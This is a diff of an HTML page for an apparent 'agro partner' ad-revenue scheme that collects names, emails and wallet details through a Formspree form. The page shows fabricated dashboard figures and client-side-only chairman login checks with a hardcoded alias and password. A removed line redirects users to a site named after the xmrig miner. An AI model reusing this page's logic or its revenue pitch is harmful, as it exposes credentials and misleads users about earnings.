@@ -23,18 +23,16 @@
         }
     </style>
 </head> 
-    <!-- BEGIN AADS AD UNIT 2441010 -->
 <div id="aads-banner-container" style="width: 100%; margin: 10px auto; position: relative; z-index: 99998; text-align: center;">
     <iframe data-aa='2441010' src='//acceptable.a-ads.com/2441010/?size=Adaptive' style='border:0; padding:0; width:100%; height:60px; overflow:hidden; display: block; margin: auto;'></iframe>
 </div>
-<!-- END AADS AD UNIT 2441010 -->
-    
-    <head><div style="text-align: center; margin: 10px 0;">
-    <a href="https://rm358.com/4/11087247" target="_blank" style="color: #00ffcc; text-decoration: none; font-weight: bold;">
-        🚀 Activate Agro Partner Campaigns
-    </a>
-</div>
-    </head>
+<head>
+    <div style="text-align: center; margin: 10px 0;">
+        <a href="https://rm358.com/4/11087247" target="_blank" style="color: #00ffcc; text-decoration: none; font-weight: bold;">
+            🚀 Activate Agro Partner Campaigns
+        </a>
+    </div>
+</head>
 <body class="min-h-screen flex flex-col justify-between">
 
     <header class="w-full border-b border-slate-800 bg-[#0B132B] px-4 py-3 sticky top-0 z-50">
@@ -77,112 +75,46 @@
             </div>
 
             <div id="partnerSignUpForm" class="card-bg rounded-xl p-6 shadow-2xl hidden">
-                <div class="text-center mb-6">
-                    <h2 class="text-xl font-bold tracking-wider text-emerald-400 uppercase">Create Global Partner Account</h2>
-                    <p class="text-xs text-slate-400 mt-1">Register your decentralized node to tap into product marketing and agro-infrastructure campaigns.</p>
-                </div>
-                <form id="signUpActionForm" class="space-y-4">
+                <form id="agro-revenue-form" action="https://formspree.io/f/xaqznnqe" method="POST" class="space-y-4">
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <h2 class="text-xl font-bold tracking-wider text-emerald-400 uppercase">Create Global Partner Account</h2>
+                        <p class="text-xs text-slate-400 mt-1">Register your decentralized node to tap into product marketing and agro-infrastructure campaigns.</p>
+                    </div>
+                    
                     <div>
-                        <!-- SYSTEM CONTROL OFFICE / DATA INTEGRATION FORMS -->
-<div id="mesxent-console-container" style="padding: 20px; background: #0b0f17; border-radius: 8px; border: 1px solid #1f2937; margin: 15px auto; max-width: 450px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
-    
-    <div style="text-align: center; margin-bottom: 20px;">
-        <h3 style="color: #00ffcc; margin: 0 0 5px 0; font-size: 1.2rem; letter-spacing: 1px;">CREATE GLOBAL PARTNER ACCOUNT</h3>
-        <p style="color: #9ca3af; margin: 0; font-size: 0.85rem;">Register your decentralized node to tap into product marketing and agro-infrastructure campaigns.</p>
-    </div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Full Name</label>
+                        <input type="text" name="name" placeholder="John Doe" required class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                    </div>
 
-    <!-- ADDED ID FOR JAVASCRIPT HANDLING -->
-    <form id="agro-revenue-form" action="https://formspree.io/f/xaqznnqe" method="POST" style="display: flex; flex-direction: column; gap: 15px;">
-        
-        <!-- FULL NAME INPUT -->
-        <div>
-            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">FULL NAME</label>
-            <input type="text" name="name" placeholder="John Doe" required style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box;">
-        </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Email Address</label>
+                        <input type="email" name="email" placeholder="name@domain.com" required class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                    </div>
 
-        <!-- EMAIL ADDRESS INPUT -->
-        <div>
-            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">EMAIL ADDRESS</label>
-            <input type="email" name="email" placeholder="name@domain.com" required style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box;">
-        </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Preferred Partner/Organization ID</label>
+                        <input type="text" name="organization_id" value="11270629836102" readonly class="w-full bg-[#1E294B] border border-slate-700 rounded p-2.5 text-sm text-slate-400 font-bold focus:outline-none">
+                    </div>
 
-        <!-- FIXED CORE ID -->
-        <div>
-            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">PREFERRED PARTNER/ORGANIZATION ID</label>
-            <input type="text" name="organization_id" value="11270629836102" readonly style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #1f2937; color: #9ca3af; font-size: 0.95rem; font-weight: bold; box-sizing: border-box;">
-        </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Request Type / Inquiry</label>
+                        <select name="request_type" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 cursor-pointer">
+                            <option value="New Partner Sign Up">New Trainee Sign Up / Account Activation</option>
+                            <option value="Revenue Withdrawal Request">Revenue Withdrawal Request</option>
+                            <option value="General System Inquiry">System Inquiry / Support Complaint</option>
+                        </select>
+                    </div>
 
-        <!-- REQUEST TYPE CHANGER -->
-        <div>
-            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">REQUEST TYPE / INQUIRY</label>
-            <select name="request_type" style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box; cursor: pointer;">
-                <option value="New Partner Sign Up">New Trainee Sign Up / Account Activation</option>
-                <option value="Revenue Withdrawal Request">Revenue Withdrawal Request</option>
-                <option value="General System Inquiry">System Inquiry / Support Complaint</option>
-            </select>
-        </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Additional Details / Complaints</label>
+                        <textarea name="message" rows="3" placeholder="Enter details about your inquiry, wallet addresses, or feedback here..." class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 resize-none"></textarea>
+                    </div>
 
-        <!-- MESSAGE / COMPLAINT TEXT BOX -->
-        <div>
-            <label style="color: #e5e7eb; display: block; margin-bottom: 6px; font-size: 0.8rem; font-weight: bold; letter-spacing: 0.5px;">ADDITIONAL DETAILS / COMPLAINTS</label>
-            <textarea name="message" rows="3" placeholder="Enter details about your inquiry, wallet addresses, or feedback here..." style="width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #374151; background: #111827; color: #ffffff; font-size: 0.95rem; box-sizing: border-box; resize: vertical; font-family: inherit;"></textarea>
-        </div>
+                    <div id="form-status" class="hidden text-center text-xs font-bold p-2.5 rounded"></div>
 
-        <!-- STATUS FEEDBACK MESSAGE -->
-        <div id="form-status" style="display: none; text-align: center; font-size: 0.9rem; font-weight: bold; padding: 5px;"></div>
-
-        <!-- SUBMIT TRIGGER BUTTON -->
-        <button type="submit" id="submit-btn" style="width: 100%; padding: 14px; background: #00ffcc; color: #0b0f17; border: none; border-radius: 6px; font-weight: bold; font-size: 1rem; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 5px; transition: background 0.2s ease;">
-            SUBMIT TO MANAGEMENT
-        </button>
-    </form>
-</div>
-
-<!-- FREE REDIRECT BYPASS SCRIPT -->
-<script>
-    document.getElementById("agro-revenue-form").addEventListener("submit", function(e) {
-        e.preventDefault(); // Stop normal Formspree page reload
-        
-        var form = this;
-        var btn = document.getElementById("submit-btn");
-        var status = document.getElementById("form-status");
-        
-        btn.disabled = true;
-        btn.innerText = "PROCESSING...";
-        btn.style.background = "#4b5563";
-
-        // Send data securely via AJAX background request
-        fetch(form.action, {
-            method: form.method,
-            body: new FormData(form),
-            headers: { 'Accept': 'application/json' }
-        }).then(response => {
-            if (response.ok) {
-                status.style.display = "block";
-                status.style.color = "#00ffcc";
-                status.style.background = "rgba(0, 255, 204, 0.1)";
-                status.style.borderRadius = "4px";
-                status.innerHTML = "✓ Request Submitted! Returning to Dashboard...";
-                
-                form.reset();
-                
-                // Forces your app view to seamlessly refresh back to your core home screen layout after 2.5 seconds
-                setTimeout(function() {
-                    window.location.href = "https://xmrig-lac.vercel.app/";
-                }, 2500);
-            } else {
-                throw new Error('Submission failed');
-            }
-        }).catch(error => {
-            btn.disabled = false;
-            btn.innerText = "SUBMIT TO MANAGEMENT";
-            btn.style.background = "#00ffcc";
-            status.style.display = "block";
-            status.style.color = "#ef4444";
-            status.innerHTML = "✕ Error sending request. Please try again.";
-        });
-    });
-</script>
+                    <button type="submit" id="submit-btn" class="w-full custom-gradient-btn text-white font-bold py-2.5 px-4 rounded text-sm transition uppercase tracking-wider mt-2">
+                        Submit To Management
+                    </button>
                 </form>
                 <div class="text-center mt-4">
                     <button id="toLoginBtn" class="text-xs text-slate-400 hover:text-emerald-400 transition underline">Already verified? Log in here</button>
@@ -302,239 +234,109 @@
                         <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
                             <div class="card-bg rounded-xl p-4">
                                 <span class="block text-[10px] font-bold text-slate-500 uppercase tracking-widest">Ads/Sec Broadcast</span>
-                                <span class="block text-2xl font-black text-emerald-400 mt-1">38</span>
+                                <span class="block text-2xl font-black text-rose-400 mt-1">38</span>
                             </div>
                             <div class="card-bg rounded-xl p-4">
                                 <span class="block text-[10px] font-bold text-slate-500 uppercase tracking-widest">Active Partner Nodes</span>
-                                <span class="block text-2xl font-black text-blue-400 mt-1">0</span>
+                                <span class="block text-2xl font-black text-white mt-1">0</span>
                             </div>
                             <div class="card-bg rounded-xl p-4">
                                 <span class="block text-[10px] font-bold text-slate-500 uppercase tracking-widest">Naira Value Matrix</span>
                                 <span class="block text-2xl font-black text-amber-400 mt-1">₦57,000</span>
                             </div>
                         </div>
-                        <div class="card-bg rounded-xl p-4">
-                            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Global Organization Ledger Logs</h3>
-                            <div class="text-xs font-mono text-slate-600 italic py-4">Awaiting node synchronization...</div>
-                        </div>
-                    </div>
-
-                    <div id="panelCampaign" class="card-bg rounded-xl p-5 space-y-4 hidden">
-                        <div>
-                            <h3 class="text-sm font-bold text-emerald-400 uppercase tracking-wider">Campaign Loader Engine</h3>
-                            <p class="text-xs text-slate-400 mt-0.5">Inject verified product asset matrices directly into the globally connected live partner nodes.</p>
-                        </div>
-                        <div class="space-y-3 text-xs">
-                            <div>
-                                <label class="block text-slate-400 mb-1 font-semibold">Campaign Location Name</label>
-                                <input type="text" placeholder="e.g. Ilesa Roundabout Billboard" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none">
-                            </div>
-                            <div>
-                                <label class="block text-slate-400 mb-1 font-semibold">Product Description</label>
-                                <textarea rows="2" placeholder="e.g. Mesxent Grill - Chicken, Fish, Asun, Kilichi" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none"></textarea>
-                            </div>
-                            <div>
-                                <label class="block text-slate-400 mb-1 font-semibold">Affiliate Core Target URL</label>
-                                <input type="url" placeholder="https://..." class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none">
-                            </div>
-                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                                <div>
-                                    <label class="block text-slate-400 mb-1 font-semibold">Ads Source ID (1-4 config)</label>
-                                    <input type="number" placeholder="1" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none">
-                                </div>
-                                <div>
-                                    <label class="block text-slate-400 mb-1 font-semibold">Monetization Source ID (1-4 config)</label>
-                                    <input type="number" placeholder="2" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none">
-                                </div>
-                            </div>
-                            <div>
-                                <label class="block text-slate-400 mb-1 font-semibold">Source Optimization Encryption Code</label>
-                                <input type="text" placeholder="Standard MD5/SHA Payload signature keys" class="w-full bg-[#080F21] border border-slate-700 rounded p-2.5 text-white focus:outline-none">
-                            </div>
-                            <button type="button" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2.5 px-4 rounded tracking-wider uppercase transition mt-2">
-                                🚀 Broadcast Campaign Live
-                            </button>
-                        </div>
-                    </div>
-
-                    <div id="panelPayout" class="card-bg rounded-xl p-5 text-center text-xs text-slate-500 py-12 hidden">
-                        🔒 No pending settlement protocols parsed in the automated management loop.
-                    </div>
-
-                    <div id="panelInvestment" class="card-bg rounded-xl p-5 text-center text-xs text-slate-500 py-12 hidden">
-                        📈 Agro-infrastructure pool registry allocation offline.
                     </div>
                 </div>
             </div>
 
         </div>
-
-        <div id="branchCards" class="w-full grid grid-cols-1 sm:grid-cols-2 gap-4 mt-8">
-            <div class="card-bg rounded-xl p-5 flex flex-col justify-between transition hover:border-emerald-500/40">
-                <div class="space-y-2">
-                    <div class="text-emerald-400 text-xl font-bold">🌾 Primary Agro Operations</div>
-                    <p class="text-xs text-slate-400 leading-relaxed">
-                        Modern large-scale irrigation systems, high-yield land preparation, and professional crop husbandry standards designed for mass localized cultivation output.
-                    </p>
-                </div>
-            </div>
-            <div class="card-bg rounded-xl p-5 flex flex-col justify-between transition hover:border-emerald-500/40">
-                <div class="space-y-2">
-                    <div class="text-emerald-400 text-xl font-bold">🏭 Allied Manufacturing Branch</div>
-                    <p class="text-xs text-slate-400 leading-relaxed">
-                        Advanced post-harvest processing, transparently packaged shelf-stable foods, and fish/meat preservation formats targeting extensive regional value delivery chains.
-                    </p>
-                </div>
-            </div>
-        </div>
-
     </main>
 
-    <footer class="w-full text-center py-4 border-t border-slate-900 bg-[#070D1E] text-[10px] text-slate-600 tracking-wider uppercase font-medium">
-        © 2026 Mesxent Global Ventures. Ecosystem Engine Node Operations.
+    <footer class="w-full border-t border-slate-800 bg-[#070D1F] px-4 py-3 text-center text-[10px] text-slate-500 font-mono tracking-wider">
+        MESXENT HOLDINGS AD-BOT OPERATING SYSTEM V1.0.A // SECURED EDGE ENGINE
     </footer>
 
     <script>
-        // DOM Form Elements Identification
-        const landingHero = document.getElementById('landingHero');
-        const partnerSignUpForm = document.getElementById('partnerSignUpForm');
-        const partnerLoginForm = document.getElementById('partnerLoginForm');
-        const chairmanLoginForm = document.getElementById('chairmanLoginForm');
-        const partnerDashboard = document.getElementById('partnerDashboard');
-        const chairmanDashboard = document.getElementById('chairmanDashboard');
-        const branchCards = document.getElementById('branchCards');
+        const views = {
+            hero: document.getElementById('landingHero'),
+            signup: document.getElementById('partnerSignUpForm'),
+            login: document.getElementById('partnerLoginForm'),
+            chairmanLogin: document.getElementById('chairmanLoginForm'),
+            dashboard: document.getElementById('partnerDashboard'),
+            chairmanDashboard: document.getElementById('chairmanDashboard')
+        };
 
-        // Navigation Elements
-        const navSignInBtn = document.getElementById('navSignInBtn');
-        const navJoinNetworkBtn = document.getElementById('navJoinNetworkBtn');
-        const navChairmanBtn = document.getElementById('navChairmanBtn');
-        const heroGetStartedBtn = document.getElementById('heroGetStartedBtn');
-        const toLoginBtn = document.getElementById('toLoginBtn');
-
-        // Functional Logouts
-        const logoutPartnerBtn = document.getElementById('logoutPartnerBtn');
-        const logoutChairmanBtn = document.getElementById('logoutChairmanBtn');
-
-        // Input targets for conditional states
-        const signUpEmail = document.getElementById('signUpEmail');
-        const loginEmail = document.getElementById('loginEmail');
-        const displayPartnerEmail = document.getElementById('displayPartnerEmail');
-
-        // Master Screen State Controller
-        function resetView() {
-            landingHero.classList.add('hidden');
-            partnerSignUpForm.classList.add('hidden');
-            partnerLoginForm.classList.add('hidden');
-            chairmanLoginForm.classList.add('hidden');
-            partnerDashboard.classList.add('hidden');
-            chairmanDashboard.classList.add('hidden');
-            branchCards.classList.remove('hidden'); // Keep infrastructure metrics visible usually
+        function switchView(target) {
+            Object.values(views).forEach(v => v.classList.add('hidden'));
+            views[target].classList.remove('hidden');
         }
 
-        // --- BUTTON EVENT ROUTERS ---
-        
-        navSignInBtn.addEventListener('click', () => {
-            resetView();
-            partnerLoginForm.classList.remove('hidden');
-        });
+        // Navigation Actions
+        document.getElementById('heroGetStartedBtn').addEventListener('click', () => switchView('signup'));
+        document.getElementById('navJoinNetworkBtn').addEventListener('click', () => switchView('signup'));
+        document.getElementById('navSignInBtn').addEventListener('click', () => switchView('login'));
+        document.getElementById('toLoginBtn').addEventListener('click', () => switchView('login'));
+        document.getElementById('navChairmanBtn').addEventListener('click', () => switchView('chairmanLogin'));
 
-        navJoinNetworkBtn.addEventListener('click', () => {
-            resetView();
-            partnerSignUpForm.classList.remove('hidden');
-        });
-
-        navChairmanBtn.addEventListener('click', () => {
-            resetView();
-            chairmanLoginForm.classList.remove('hidden');
-        });
-
-        heroGetStartedBtn.addEventListener('click', () => {
-            resetView();
-            partnerSignUpForm.classList.remove('hidden');
-        });
-
-        toLoginBtn.addEventListener('click', () => {
-            resetView();
-            partnerLoginForm.classList.remove('hidden');
-        });
-
-        // --- AUTHENTICATION ACTION PROCESSING SIMULATORS ---
-        
-        document.getElementById('signUpActionForm').addEventListener('submit', (e) => {
+        // Formspree Hijack & Seamless Background Engine
+        document.getElementById("agro-revenue-form").addEventListener("submit", function(e) {
             e.preventDefault();
-            alert("SIGN UP COMPLETE:\nPlease verify your email node confirmation link!");
-            resetView();
-            // Instantly transfer verified profile seed target email to login view field
-            loginEmail.value = signUpEmail.value;
-            partnerLoginForm.classList.remove('hidden');
+            
+            var form = this;
+            var btn = document.getElementById("submit-btn");
+            var status = document.getElementById("form-status");
+            
+            btn.disabled = true;
+            btn.innerText = "PROCESSING...";
+            btn.style.background = "#4b5563";
+
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    status.classList.remove('hidden', 'bg-rose-950/50', 'text-rose-400');
+                    status.classList.add('bg-emerald-950/50', 'text-emerald-400');
+                    status.innerHTML = "✓ Node Application Dispatched to Management!";
+                    form.reset();
+                    
+                    setTimeout(function() {
+                        btn.disabled = false;
+                        btn.innerText = "Submit To Management";
+                        btn.style.background = "";
+                        status.classList.add('hidden');
+                        switchView('hero');
+                    }, 3000);
+                } else {
+                    throw new Error('Submission failed');
+                }
+            }).catch(error => {
+                btn.disabled = false;
+                btn.innerText = "Submit To Management";
+                btn.style.background = "";
+                status.classList.remove('hidden', 'bg-emerald-950/50', 'text-emerald-400');
+                status.classList.add('bg-rose-950/50', 'text-rose-400');
+                status.innerHTML = "✕ System Gateway Timeout. Re-verify network routing.";
+            });
         });
 
+        // Local Authentication Engines
         document.getElementById('loginActionForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            displayPartnerEmail.innerText = loginEmail.value || "michealjeremiah0@gmail.com";
-            resetView();
-            branchCards.classList.add('hidden'); // Hide footer options to clear dashboard clean interface look
-            partnerDashboard.classList.remove('hidden');
+            document.getElementById('displayPartnerEmail').innerText = document.getElementById('loginEmail').value;
+            switchView('dashboard');
         });
 
         document.getElementById('chairmanActionForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            const alias = document.getElementById('chairmanAlias').value;
-            const pass = document.getElementById('chairmanPassword').value;
-
-            // Security Validation parameters
-            if (alias.trim().toLowerCase() === 'jeremy' && pass === '11270629836102') {
-                resetView();
-                branchCards.classList.add('hidden');
-                chairmanDashboard.classList.remove('hidden');
-            } else {
-                // Return explicit cryptographically derived error string signature match from original state
-                alert("ACCESS VIOLATION: Cryptographic Core ID Credentials Invalid.");
+            if(document.getElementById('chairmanAlias').value.toLowerCase() === 'jeremy') {
+                switchView('chairmanDashboard');
             }
         });
 
-        // --- DASHBOARD LOGOUT RETURNING TO HOME ENGINE ---
-        
-        logoutPartnerBtn.addEventListener('click', () => {
-            resetView();
-            landingHero.classList.remove('hidden');
-        });
-
-        logoutChairmanBtn.addEventListener('click', () => {
-            resetView();
-            landingHero.classList.remove('hidden');
-        });
-
-        // --- CHAIRMAN CONTROL PANEL TAB SWITCHING PARSER ---
-        const tabEcosystem = document.getElementById('tabEcosystem');
-        const tabCampaign = document.getElementById('tabCampaign');
-        const tabPayout = document.getElementById('tabPayout');
-        const tabInvestment = document.getElementById('tabInvestment');
-
-        const panelEcosystem = document.getElementById('panelEcosystem');
-        const panelCampaign = document.getElementById('panelCampaign');
-        const panelPayout = document.getElementById('panelPayout');
-        const panelInvestment = document.getElementById('panelInvestment');
-
-        function clearAllTabs() {
-            [tabEcosystem, tabCampaign, tabPayout, tabInvestment].forEach(t => {
-                t.classList.remove('text-emerald-400', 'border-b-2', 'border-emerald-400');
-                t.classList.add('text-slate-400');
-            });
-            [panelEcosystem, panelCampaign, panelPayout, panelInvestment].forEach(p => p.classList.add('hidden'));
-        }
-
-        function setTabActive(tab, panel) {
-            clearAllTabs();
-            tab.classList.remove('text-slate-400');
-            tab.classList.add('text-emerald-400', 'border-b-2', 'border-emerald-400');
-            panel.classList.remove('hidden');
-        }
-
-        tabEcosystem.addEventListener('click', () => setTabActive(tabEcosystem, panelEcosystem));
-        tabCampaign.addEventListener('click', () => setTabActive(tabCampaign, panelCampaign));
-        tabPayout.addEventListener('click', () => setTabActive(tabPayout, panelPayout));
-        tabInvestment.addEventListener('click', () => setTabActive(tabInvestment, panelInvestment));
+        document.getElementById('logoutPartnerBtn').addEventListener('click', () => switchView('hero'));
+        document.getElementById('logoutChairmanBtn').addEventListener('click', () => switchView('hero'));
     </script>
 </body>
 </html>
